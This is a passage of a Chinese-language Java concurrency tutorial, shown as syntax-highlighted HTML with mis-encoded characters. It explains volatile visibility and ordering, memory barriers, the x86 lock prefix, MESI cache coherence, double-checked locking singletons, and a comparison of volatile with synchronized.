<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// âš ï¸ ä¸æ˜¯åŸå­æ“ä½œ</span>
}

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        increment();
    }
});

<span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
        increment();
    }
});

t1.start();
t2.start();
<span class="hljs-comment">// ç»“æœï¼šæœŸæœ›20000ï¼Œå®é™…å¯èƒ½å°äº20000 âŒ</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆcount++ä¸æ˜¯åŸå­çš„ï¼Ÿ</strong></p>
<p><code>count++</code>å®é™…ä¸ŠåŒ…å«ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// count++çš„åˆ†è§£æ­¥éª¤</span>
<span class="hljs-number">1.</span> è¯»å–countçš„å€¼     (read)
<span class="hljs-number">2.</span> å°†countåŠ <span class="hljs-number">1</span>        (add)
<span class="hljs-number">3.</span> å°†æ–°å€¼å†™å›count   (write)

<span class="hljs-comment">// é—®é¢˜ï¼šè¿™ä¸‰ä¸ªæ­¥éª¤ä¹‹é—´å¯èƒ½è¢«å…¶ä»–çº¿ç¨‹æ‰“æ–­</span>
çº¿ç¨‹<span class="hljs-number">1</span>ï¼šread(count=<span class="hljs-number">100</span>) â†’ add(<span class="hljs-number">101</span>) â†’ [è¢«çº¿ç¨‹<span class="hljs-number">2</span>æ‰“æ–­]
çº¿ç¨‹<span class="hljs-number">2</span>ï¼šread(count=<span class="hljs-number">100</span>) â†’ add(<span class="hljs-number">101</span>) â†’ write(<span class="hljs-number">101</span>)
çº¿ç¨‹<span class="hljs-number">1</span>ï¼šwrite(<span class="hljs-number">101</span>)  <span class="hljs-comment">// ä¸¤ä¸ªçº¿ç¨‹éƒ½åŠ äº†1ï¼Œä½†ç»“æœåªåŠ äº†1æ¬¡</span>
</code></pre>
<p><strong>volatileä¸ºä»€ä¹ˆä¸èƒ½ä¿è¯åŸå­æ€§ï¼Ÿ</strong></p>
<ul>
<li>volatileåªèƒ½ä¿è¯<strong>å•ä¸ªè¯»å†™æ“ä½œ</strong>çš„å¯è§æ€§</li>
<li>ä½†<code>count++</code>æ˜¯<strong>å¤šä¸ªæ“ä½œ</strong>ï¼ˆè¯»-æ”¹-å†™ï¼‰</li>
<li>volatileæ— æ³•ä¿è¯è¿™ä¸‰ä¸ªæ“ä½œä½œä¸ºä¸€ä¸ªæ•´ä½“æ‰§è¡Œ</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ–¹æ¡ˆ1ï¼šä½¿ç”¨synchronized</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count++;  <span class="hljs-comment">// æ•´ä¸ªæ–¹æ³•åŸå­æ‰§è¡Œ</span>
}

<span class="hljs-comment">// âœ… æ–¹æ¡ˆ2ï¼šä½¿ç”¨åŸå­ç±»ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
    count.incrementAndGet();  <span class="hljs-comment">// åŸå­æ“ä½œï¼Œå†…éƒ¨ä½¿ç”¨CAS</span>
}
</code></pre>
<p><strong>æ€»ç»“ï¼š</strong></p>
<ul>
<li>âœ… volatileä¿è¯ï¼šå¯è§æ€§ã€æœ‰åºæ€§</li>
<li>âŒ volatileä¸ä¿è¯ï¼šåŸå­æ€§ï¼ˆéœ€è¦synchronizedæˆ–åŸå­ç±»ï¼‰</li>
</ul>
<h3 data-id="heading-86">4.2 volatileçš„å®ç°åŸç†</h3>
<p><strong>volatileå¦‚ä½•å®ç°å¯è§æ€§å’Œæœ‰åºæ€§ï¼Ÿ</strong></p>
<ul>
<li>é€šè¿‡<strong>å†…å­˜å±éšœ</strong>ï¼ˆMemory Barrierï¼‰å®ç°</li>
<li>é€šè¿‡<strong>Lockå‰ç¼€æŒ‡ä»¤</strong>ï¼ˆCPUçº§åˆ«ï¼‰å®ç°</li>
<li>é€šè¿‡<strong>MESIç¼“å­˜ä¸€è‡´æ€§åè®®</strong>ï¼ˆç¡¬ä»¶çº§åˆ«ï¼‰å®ç°</li>
</ul>
<h4 data-id="heading-87">å†…å­˜å±éšœï¼ˆMemory Barrierï¼‰</h4>
<p><strong>ä»€ä¹ˆæ˜¯å†…å­˜å±éšœï¼Ÿ</strong></p>
<p>å†…å­˜å±éšœæ˜¯ä¸€ç±»CPUæŒ‡ä»¤ï¼Œç”¨äºï¼š</p>
<ul>
<li>âœ… <strong>é˜»æ­¢é‡æ’åº</strong>ï¼šç¡®ä¿å±éšœä¸¤ä¾§çš„æŒ‡ä»¤ä¸ä¼šé‡æ’åº</li>
<li>âœ… <strong>ä¿è¯å¯è§æ€§</strong>ï¼šå¼ºåˆ¶åˆ·æ–°ç¼“å­˜ï¼Œä½¿ä¿®æ”¹å¯¹å…¶ä»–CPUå¯è§</li>
</ul>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å°±åƒé“è·¯ä¸Šçš„"æ æ†"ï¼Œé˜»æ­¢è½¦è¾†ï¼ˆæŒ‡ä»¤ï¼‰è·¨è¶Š</li>
<li>ç¡®ä¿æŒ‡ä»¤æŒ‰ç…§é¢„æœŸé¡ºåºæ‰§è¡Œ</li>
<li>å¼ºåˆ¶æ•°æ®åŒæ­¥åˆ°ä¸»å†…å­˜</li>
</ul>
<p><strong>JMMå®šä¹‰çš„å››ç§å†…å­˜å±éšœï¼š</strong></p>
<p><strong>1. LoadLoadå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Load1;        <span class="hljs-comment">// åŠ è½½æ“ä½œ1</span>
LoadLoadå±éšœ; <span class="hljs-comment">// æ æ†</span>
Load2;        <span class="hljs-comment">// åŠ è½½æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Load1åœ¨Load2ä¹‹å‰æ‰§è¡Œ</p>
<p><strong>2. StoreStoreå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Store1;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ1</span>
StoreStoreå±éšœ; <span class="hljs-comment">// æ æ†</span>
Store2;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Store1çš„æ•°æ®åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼Œå†æ‰§è¡ŒStore2</p>
<p><strong>3. LoadStoreå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Load1;        <span class="hljs-comment">// åŠ è½½æ“ä½œ1</span>
LoadStoreå±éšœ; <span class="hljs-comment">// æ æ†</span>
Store2;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Load1åœ¨Store2ä¹‹å‰æ‰§è¡Œ</p>
<p><strong>4. StoreLoadå±éšœ</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">Store1;        <span class="hljs-comment">// å­˜å‚¨æ“ä½œ1</span>
StoreLoadå±éšœ; <span class="hljs-comment">// æ æ†ï¼ˆæœ€é‡ï¼Œå¼€é”€æœ€å¤§ï¼‰</span>
Load2;         <span class="hljs-comment">// åŠ è½½æ“ä½œ2</span>
</code></pre>
<p>ä½œç”¨ï¼šç¡®ä¿Store1çš„æ•°æ®åˆ·æ–°åˆ°ä¸»å†…å­˜ï¼Œå†æ‰§è¡ŒLoad2</p>
<p><strong>volatileçš„å†…å­˜å±éšœæ’å…¥ç­–ç•¥ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
<span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;

<span class="hljs-comment">// volatileå†™æ“ä½œ</span>
a = <span class="hljs-number">1</span>;              <span class="hljs-comment">// æ™®é€šå†™</span>
â”€â”€â”€â”€â”€â”€â”€ StoreStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢æ™®é€šå†™å’Œ<span class="hljs-keyword">volatile</span>å†™é‡æ’åº
x = <span class="hljs-number">1</span>;              <span class="hljs-comment">// volatileå†™</span>
â”€â”€â”€â”€â”€â”€â”€ StoreLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>å†™å’Œåé¢çš„æ“ä½œé‡æ’åº

<span class="hljs-comment">// volatileè¯»æ“ä½œ</span>
<span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> x;         <span class="hljs-comment">// volatileè¯»</span>
â”€â”€â”€â”€â”€â”€â”€ LoadLoadå±éšœ â”€â”€â”€â”€â”€â”€â”€  â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œåé¢çš„è¯»é‡æ’åº
â”€â”€â”€â”€â”€â”€â”€ LoadStoreå±éšœ â”€â”€â”€â”€â”€â”€â”€ â† ç¦æ­¢<span class="hljs-keyword">volatile</span>è¯»å’Œåé¢çš„å†™é‡æ’åº
<span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> a;         <span class="hljs-comment">// æ™®é€šè¯»</span>
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>volatileå†™å‰æ’å…¥StoreStoreå±éšœ</li>
<li>volatileå†™åæ’å…¥StoreLoadå±éšœ</li>
<li>volatileè¯»åæ’å…¥LoadLoadå’ŒLoadStoreå±éšœ</li>
<li>é€šè¿‡è¿™äº›å±éšœä¿è¯å¯è§æ€§å’Œæœ‰åºæ€§</li>
</ul>
<h4 data-id="heading-88">Lockå‰ç¼€æŒ‡ä»¤</h4>
<p><strong>x86æ¶æ„ä¸‹çš„å®ç°ï¼š</strong></p>
<p>volatileå†™æ“ä½œåœ¨x86æ¶æ„ä¸‹ä¼šè¢«ç¼–è¯‘ä¸ºå¸¦æœ‰<code>lock</code>å‰ç¼€çš„æŒ‡ä»¤ã€‚</p>
<p><strong>æ±‡ç¼–ä»£ç ç¤ºä¾‹ï¼ˆäº†è§£å³å¯ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-assembly" lang="assembly">; volatileå†™æ“ä½œ
mov    %eax,0x10(%esi)    ; å°†å€¼å†™å…¥å†…å­˜
lock addl $0x0,(%esp)     ; lockå‰ç¼€ï¼Œé”å®šç¼“å­˜è¡Œ
</code></pre>
<p><strong>lockå‰ç¼€çš„ä½œç”¨ï¼š</strong></p>
<ol>
<li>
<p><strong>é”å®šæ€»çº¿æˆ–ç¼“å­˜è¡Œ</strong></p>
<ul>
<li>åœ¨å¤šæ ¸CPUä¸­ï¼Œç¡®ä¿åªæœ‰ä¸€ä¸ªCPUèƒ½æ‰§è¡Œè¿™ä¸ªæŒ‡ä»¤</li>
<li>ä¿è¯æ“ä½œçš„åŸå­æ€§</li>
</ul>
</li>
<li>
<p><strong>åˆ·æ–°ç¼“å­˜</strong></p>
<ul>
<li>å°†ç¼“å­˜ä¸­çš„æ•°æ®å†™å›ä¸»å†…å­˜</li>
<li>ä½¿å…¶ä»–CPUçš„ç¼“å­˜å¤±æ•ˆ</li>
<li>ä¿è¯å¯è§æ€§</li>
</ul>
</li>
</ol>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>lockå‰ç¼€å°±åƒç»™æ“ä½œåŠ äº†ä¸€æŠŠ"é”"</li>
<li>ç¡®ä¿æ“ä½œæ˜¯åŸå­çš„ã€å¯è§çš„</li>
<li>CPUç¡¬ä»¶å±‚é¢çš„ä¿è¯</li>
</ul>
<h4 data-id="heading-89">MESIç¼“å­˜ä¸€è‡´æ€§åè®®</h4>
<p><strong>ä»€ä¹ˆæ˜¯MESIï¼Ÿ</strong></p>
<p>MESIæ˜¯å¤šæ ¸CPUçš„ç¼“å­˜ä¸€è‡´æ€§åè®®ï¼Œç”¨äºä¿è¯å¤šæ ¸CPUä¹‹é—´ç¼“å­˜çš„ä¸€è‡´æ€§ã€‚</p>
<p><strong>MESIçš„å››ç§çŠ¶æ€ï¼š</strong></p>






























<table><thead><tr><th>çŠ¶æ€</th><th>å…¨ç§°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td><strong>M</strong></td><td>Modified</td><td>ç¼“å­˜è¡Œè¢«ä¿®æ”¹ï¼Œä¸ä¸»å†…å­˜ä¸ä¸€è‡´</td></tr><tr><td><strong>E</strong></td><td>Exclusive</td><td>ç¼“å­˜è¡Œç‹¬å ï¼Œä¸ä¸»å†…å­˜ä¸€è‡´</td></tr><tr><td><strong>S</strong></td><td>Shared</td><td>ç¼“å­˜è¡Œå…±äº«ï¼Œä¸ä¸»å†…å­˜ä¸€è‡´</td></tr><tr><td><strong>I</strong></td><td>Invalid</td><td>ç¼“å­˜è¡Œæ— æ•ˆï¼Œéœ€è¦ä»ä¸»å†…å­˜åŠ è½½</td></tr></tbody></table>
<p><strong>volatileå˜é‡çš„ç¼“å­˜ä¸€è‡´æ€§ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">åœºæ™¯ï¼šCPU1å†™volatileå˜é‡

<span class="hljs-bullet">1.</span> CPU1ä¿®æ”¹volatileå˜é‡
   â†’ ç¼“å­˜è¡ŒçŠ¶æ€å˜ä¸ºMï¼ˆModifiedï¼‰

<span class="hljs-bullet">2.</span> é€šè¿‡æ€»çº¿å‘é€æ¶ˆæ¯
   â†’ é€šçŸ¥å…¶ä»–CPUï¼šè¿™ä¸ªç¼“å­˜è¡Œå·²å¤±æ•ˆ

<span class="hljs-bullet">3.</span> å…¶ä»–CPUæ”¶åˆ°æ¶ˆæ¯
   â†’ å°†å¯¹åº”ç¼“å­˜è¡ŒçŠ¶æ€æ”¹ä¸ºIï¼ˆInvalidï¼‰

<span class="hljs-bullet">4.</span> å…¶ä»–CPUè¯»å–æ—¶
   â†’ å‘ç°ç¼“å­˜æ— æ•ˆï¼Œä»ä¸»å†…å­˜é‡æ–°åŠ è½½
   â†’ ä¿è¯è¯»åˆ°æœ€æ–°å€¼
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦MESIï¼Ÿ</strong></p>
<ul>
<li>æ¯ä¸ªCPUæœ‰è‡ªå·±çš„ç¼“å­˜</li>
<li>éœ€è¦ä¿è¯æ‰€æœ‰CPUçœ‹åˆ°çš„æ•°æ®ä¸€è‡´</li>
<li>MESIåè®®è‡ªåŠ¨å¤„ç†ç¼“å­˜ä¸€è‡´æ€§</li>
</ul>
<h3 data-id="heading-90">4.3 volatileçš„ä½¿ç”¨åœºæ™¯</h3>
<h4 data-id="heading-91">çŠ¶æ€æ ‡å¿—</h4>
<p><strong>æœ€å¸¸ç”¨çš„åœºæ™¯ï¼š</strong> ä½¿ç”¨volatileä½œä¸ºçº¿ç¨‹é—´çš„çŠ¶æ€æ ‡å¿—</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ¨èï¼šä½¿ç”¨volatileä½œä¸ºçŠ¶æ€æ ‡å¿—</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">shutdown</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shutdown</span><span class="hljs-params">()</span> {
    shutdown = <span class="hljs-literal">true</span>;  <span class="hljs-comment">// å…¶ä»–çº¿ç¨‹èƒ½ç«‹å³çœ‹åˆ°</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">while</span> (!shutdown) {
        <span class="hljs-comment">// æ‰§è¡Œä»»åŠ¡</span>
        <span class="hljs-comment">// èƒ½åŠæ—¶å“åº”shutdownçš„å˜åŒ–</span>
    }
}
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆé€‚åˆç”¨volatileï¼Ÿ</strong></p>
<ul>
<li>âœ… åªéœ€è¦å¯è§æ€§ï¼ˆçº¿ç¨‹é—´é€šä¿¡ï¼‰</li>
<li>âœ… ä¸éœ€è¦åŸå­æ€§ï¼ˆåªæ˜¯booleanæ ‡å¿—ï¼‰</li>
<li>âœ… ç®€å•é«˜æ•ˆï¼ˆæ¯”synchronizedè½»é‡ï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… çº¿ç¨‹å¯åŠ¨/åœæ­¢æ ‡å¿—</li>
<li>âœ… é…ç½®å¼€å…³</li>
<li>âœ… çŠ¶æ€åˆ‡æ¢æ ‡å¿—</li>
</ul>
<h4 data-id="heading-92">åŒé‡æ£€æŸ¥é”å®šï¼ˆDCLï¼‰</h4>
<p><strong>ä»€ä¹ˆæ˜¯DCLï¼Ÿ</strong></p>
<p>åŒé‡æ£€æŸ¥é”å®šæ˜¯ä¸€ç§å•ä¾‹æ¨¡å¼çš„å®ç°æ–¹å¼ï¼Œé€šè¿‡ä¸¤æ¬¡æ£€æŸ¥æ¥å‡å°‘é”çš„ä½¿ç”¨ã€‚</p>
<p><strong>é”™è¯¯çš„å•ä¾‹æ¨¡å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ é”™è¯¯ï¼šå¯èƒ½æœ‰é—®é¢˜</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">// æ²¡æœ‰volatile</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// ç¬¬ä¸€æ¬¡æ£€æŸ¥ï¼ˆæ— é”ï¼‰</span>
            <span class="hljs-keyword">synchronized</span>(Singleton.class) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// ç¬¬äºŒæ¬¡æ£€æŸ¥ï¼ˆæœ‰é”ï¼‰</span>
                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  <span class="hljs-comment">// âš ï¸ å¯èƒ½é‡æ’åº</span>
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<p><strong>é—®é¢˜ï¼šå¯¹è±¡åˆ›å»ºå¯èƒ½é‡æ’åº</strong></p>
<p><code>new Singleton()</code>åŒ…å«ä¸‰ä¸ªæ­¥éª¤ï¼Œå¯èƒ½è¢«é‡æ’åºï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ­£å¸¸é¡ºåº</span>
<span class="hljs-number">1.</span> åˆ†é…å†…å­˜ç©ºé—´
<span class="hljs-number">2.</span> åˆå§‹åŒ–å¯¹è±¡ï¼ˆè°ƒç”¨æ„é€ å‡½æ•°ï¼‰
<span class="hljs-number">3.</span> å°†å¼•ç”¨èµ‹å€¼ç»™instance

<span class="hljs-comment">// å¯èƒ½é‡æ’åºä¸ºï¼ˆå±é™©ï¼ï¼‰</span>
<span class="hljs-number">1.</span> åˆ†é…å†…å­˜ç©ºé—´
<span class="hljs-number">3.</span> å°†å¼•ç”¨èµ‹å€¼ç»™instance  <span class="hljs-comment">// instance != nullï¼Œä½†å¯¹è±¡æœªåˆå§‹åŒ–ï¼</span>
<span class="hljs-number">2.</span> åˆå§‹åŒ–å¯¹è±¡

<span class="hljs-comment">// é—®é¢˜ï¼šçº¿ç¨‹Bå¯èƒ½æ‹¿åˆ°æœªå®Œå…¨åˆå§‹åŒ–çš„å¯¹è±¡</span>
</code></pre>
<p><strong>ä½¿ç”¨volatileè§£å†³ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨volatile</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;  <span class="hljs-comment">// volatileç¦æ­¢é‡æ’åº</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">synchronized</span>(Singleton.class) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();  
                    <span class="hljs-comment">// volatileä¿è¯ï¼šå…ˆåˆå§‹åŒ–å¯¹è±¡ï¼Œå†èµ‹å€¼</span>
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<p><strong>volatileçš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>âœ… <strong>ç¦æ­¢é‡æ’åº</strong>ï¼šç¡®ä¿å¯¹è±¡å®Œå…¨åˆå§‹åŒ–åæ‰èµ‹å€¼</li>
<li>âœ… <strong>ä¿è¯å¯è§æ€§</strong>ï¼šå…¶ä»–çº¿ç¨‹èƒ½çœ‹åˆ°å®Œæ•´çš„å¯¹è±¡</li>
</ul>
<p><strong>DCLçš„å·¥ä½œåŸç†ï¼š</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">ç¬¬ä¸€æ¬¡æ£€æŸ¥ï¼ˆæ— é”ï¼‰ï¼šå¿«é€Ÿè·¯å¾„ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹ç›´æ¥è¿”å›
  â†“
  å¦‚æœä¸º<span class="hljs-literal">null</span>ï¼Œè¿›å…¥åŒæ­¥å—
  â†“
ç¬¬äºŒæ¬¡æ£€æŸ¥ï¼ˆæœ‰é”ï¼‰ï¼šç¡®ä¿åªåˆ›å»ºä¸€ä¸ªå®ä¾‹
  â†“
  å¦‚æœä»ä¸º<span class="hljs-literal">null</span>ï¼Œåˆ›å»ºå®ä¾‹
</code></pre>
<p><strong>ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ç¬¬ä¸€æ¬¡æ£€æŸ¥æ— é”ï¼Œæ€§èƒ½å¥½</li>
<li>åªåœ¨ç¬¬ä¸€æ¬¡åˆ›å»ºæ—¶åŠ é”</li>
<li>ä¹‹åéƒ½æ˜¯æ— é”è®¿é—®</li>
</ul>
<h4 data-id="heading-93">å•ä¾‹æ¨¡å¼ä¸­çš„åº”ç”¨</h4>
<p><strong>æšä¸¾æ–¹å¼ï¼ˆæ¨èï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Singleton</span> {
    INSTANCE;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doSomething</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p><strong>é™æ€å†…éƒ¨ç±»æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> {}
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Holder</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Singleton</span> <span class="hljs-variable">INSTANCE</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> Holder.INSTANCE;
    }
}
</code></pre>
<h3 data-id="heading-94">4.4 volatile vs synchronized</h3>
<h4 data-id="heading-95">æ€§èƒ½å¯¹æ¯”</h4>
<p><strong>volatileçš„æ€§èƒ½ï¼š</strong></p>
<ul>
<li>âœ… <strong>è¯»æ“ä½œ</strong>ï¼šæ€§èƒ½æ¥è¿‘æ™®é€šå˜é‡ï¼ˆåªæ˜¯ä»ä¸»å†…å­˜è¯»ï¼‰</li>
<li>âš ï¸ <strong>å†™æ“ä½œ</strong>ï¼šéœ€è¦åˆ·æ–°ç¼“å­˜ï¼Œæ€§èƒ½ç•¥å·®ï¼ˆä½†æ¯”synchronizedå¥½ï¼‰</li>
<li>âœ… <strong>æ€»ä½“</strong>ï¼šæ€§èƒ½ä¼˜äºsynchronized</li>
</ul>
<p><strong>synchronizedçš„æ€§èƒ½ï¼š</strong></p>
<ul>
<li><strong>JDK 1.6ä¹‹å‰</strong>ï¼šé‡é‡çº§é”ï¼Œæ€§èƒ½è¾ƒå·®</li>
<li><strong>JDK 1.6ä¹‹å</strong>ï¼šé”å‡çº§ä¼˜åŒ–ï¼Œæ€§èƒ½å¤§å¹…æå‡</li>
<li><strong>æ€»ä½“</strong>ï¼šåœ¨ä½ç«äº‰æƒ…å†µä¸‹ï¼Œæ€§èƒ½æ¥è¿‘volatile</li>
</ul>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">ä½ç«äº‰åœºæ™¯ï¼š
<span class="hljs-keyword">volatile</span>: å¾ˆå¿«ï¼ˆå‡ ä¹æ— å¼€é”€ï¼‰
<span class="hljs-keyword">synchronized</span>: è¾ƒå¿«ï¼ˆåå‘é”/è½»é‡çº§é”ï¼‰

é«˜ç«äº‰åœºæ™¯ï¼š
<span class="hljs-keyword">volatile</span>: ä»ç„¶å¾ˆå¿«ï¼ˆåªæ˜¯åˆ·æ–°ç¼“å­˜ï¼‰
<span class="hljs-keyword">synchronized</span>: å¯èƒ½å˜æ…¢ï¼ˆå‡çº§ä¸ºé‡é‡çº§é”ï¼‰
</code></pre>
<h4 data-id="heading-96">ä½¿ç”¨åœºæ™¯å¯¹æ¯”</h4>
<p><strong>åŠŸèƒ½å¯¹æ¯”è¡¨ï¼š</strong></p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>volatile</th><th>synchronized</th></tr></thead><tbody><tr><td><strong>å¯è§æ€§</strong></td><td>âœ… ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>åŸå­æ€§</strong></td><td>âŒ ä¸ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>æœ‰åºæ€§</strong></td><td>âœ… ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>äº’æ–¥æ€§</strong></td><td>âŒ ä¸ä¿è¯</td><td>âœ… ä¿è¯</td></tr><tr><td><strong>æ€§èƒ½</strong></td><td>âœ… è¾ƒé«˜</td><td>âš ï¸ ä¸­ç­‰</td></tr><tr><td><strong>ä½¿ç”¨å¤æ‚åº¦</strong></td><td>âœ… ç®€å•</td><td>âš ï¸ ä¸­ç­‰</td></tr></tbody></table>
<p><strong>volatileé€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… <strong>çŠ¶æ€æ ‡å¿—</strong>ï¼šbooleanç±»å‹çš„çº¿ç¨‹é—´é€šä¿¡</li>
<li>âœ… <strong>åŒé‡æ£€æŸ¥é”å®š</strong>ï¼šå•ä¾‹æ¨¡å¼</li>
<li>âœ… <strong>è¯»å¤šå†™å°‘</strong>ï¼šåªéœ€è¦å¯è§æ€§ï¼Œä¸éœ€è¦äº’æ–¥</li>
